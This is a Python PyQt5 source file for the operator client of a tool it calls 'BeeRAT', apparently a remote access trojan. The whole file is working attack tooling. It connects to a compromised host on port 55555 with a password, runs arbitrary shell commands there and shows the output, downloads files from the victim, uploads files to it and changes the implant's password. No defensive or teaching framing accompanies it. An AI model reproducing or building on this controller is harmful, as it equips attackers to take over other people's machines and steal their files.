from PyQt5.uic import loadUi
from PyQt5 import QtWidgets as qtw
from PyQt5 import QtTest
from lineedit import QLineEdit
import socket
import json
import os
import sys
import base64


FORMAT = 'utf-8'


class Client(qtw.QWidget):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.ui_file = 'client.ui'
        self.ui = loadUi(os.path.join(os.path.dirname(__file__), self.ui_file), self)
        self.ui.pb.clicked.connect(self.connect)
        self.ui.le.returnPressed.connect(self.enter)
        self.ui.le.setEnabled(False)

    def closeEvent(self, event) -> None:
        try:
            self.send('exit')
        except Exception:
            pass
        finally:
            sys.exit()

    def clear(self):
        self.ui.tb.clear()

    def set_prompt(self, prompt):
        self.ui.le.setPlaceholderText(prompt)

    def get_prompt(self):
        self.send('prompt')
        prompt = self.recv()
        return f'{prompt}$ '

    def rename_file(self, file_name):
        filename, extension = os.path.splitext(file_name)
        counter = 1
        while os.path.exists(file_name):
            file_name = f'{filename} ({counter}){extension}'
            counter += 1
        return file_name

    def write_file(self, filename, content):
        filename = self.rename_file(filename)
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return f'[+] {filename} downloaded successfully.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode(FORMAT)

    def uploadable(self, file_path):
        if os.path.isfile(file_path):
            return True
        if os.path.isfile(os.path.join(os.path.dirname(__file__), file_path)):
            return True
        return False

    def enter(self):
        try:
            command = self.ui.le.text()
            self.ui.le.setText("")
            self.print(f'{self.get_prompt()}{command}')
            command = command.split(' ')
            if command[0] == 'exit':
                self.send('exit')
                self.print('[-] Disconnected.')
                self.set_prompt('')
                self.ui.le.setEnabled(False)
                self.ui.le1.setEnabled(True)
                self.ui.le2.setEnabled(True)
                self.ui.pb.setEnabled(True)
            elif command[0] == 'clear':
                self.clear()
            elif command[0] == 'download':
                file_path = ' '.join(command[1:])
                self.send(f'downloadable {file_path}')
                downloadable = self.recv()
                if downloadable:
                    file_name = os.path.basename(file_path)
                    self.send(' '.join(command))
                    file_content = self.recv().encode(FORMAT)
                    self.print(self.write_file(file_name, file_content))
                else:
                    self.print(f'download: {file_path}: Not downloadable')
            elif command[0] == 'upload':
                file_path = ' '.join(command[1:])
                if self.uploadable(file_path):
                    file_name = os.path.basename(file_path)
                    file_content = self.read_file(file_path)
                    self.send(f'upload {file_name}')
                    self.send(file_content)
                    self.print(self.recv())
                else:
                    self.print(f'upload: {file_path}: Not uploadable')
            elif command[0] == 'change-password':
                password = ' '.join(command[1:])
                if len(password) >= 8:
                    self.send(' '.join(command))
                    if self.recv():
                        self.print('[+] Password saved successfully.')
                else:
                    self.print('[-] password must be at least 8 characters long.')
            else:
                command = ' '.join(command)
                self.send(command)
                result = self.recv()
                self.print(result)
                self.set_prompt(self.get_prompt())
        except ConnectionResetError:
            self.print('[-] Server disconnected.')
            self.set_prompt('')
            self.ui.le.setEnabled(False)
            self.ui.le1.setEnabled(True)
            self.ui.le2.setEnabled(True)
            self.ui.pb.setEnabled(True)
        except Exception as e:
            print(str(e))

    def print(self, text):
        self.ui.tb.append(text)

    def connect(self):
        try:
            ip = self.ui.le1.text()
            password = self.ui.le2.text()
            self.print(f'BeeRAT-Client$ connect {ip}')
            self.ui.le1.setEnabled(False)
            self.ui.le2.setEnabled(False)
            self.ui.pb.setEnabled(False)
            QtTest.QTest.qWait(500)
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.connect((ip, 55555))
            self.send(password)
            result = self.recv()
            if result:
                self.print(f'[+] Connected.')
                self.set_prompt(self.get_prompt())
                self.ui.le.setEnabled(True)
                self.ui.le1.setEnabled(False)
                self.ui.le2.setEnabled(False)
                self.ui.pb.setEnabled(False)
            else:
                self.print('[-] Password is incorrect.')
                self.ui.le1.setEnabled(True)
                self.ui.le2.setEnabled(True)
                self.ui.pb.setEnabled(True)
                self.send(None)
        except (ConnectionRefusedError, TimeoutError) as e:
            print(str(e))
            print(type(e))
            self.print('[-] Connection failed.')
            self.ui.le1.setEnabled(True)
            self.ui.le2.setEnabled(True)
            self.ui.pb.setEnabled(True)
        except Exception as e:
            print(str(e))
            self.print('[-] Invalid ip.')
            self.ui.le1.setEnabled(True)
            self.ui.le2.setEnabled(True)
            self.ui.pb.setEnabled(True)

    def send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue


def main():
    app = qtw.QApplication([])
    widget = Client()
    widget.show()
    app.exec_()


if __name__ == '__main__':
    main()
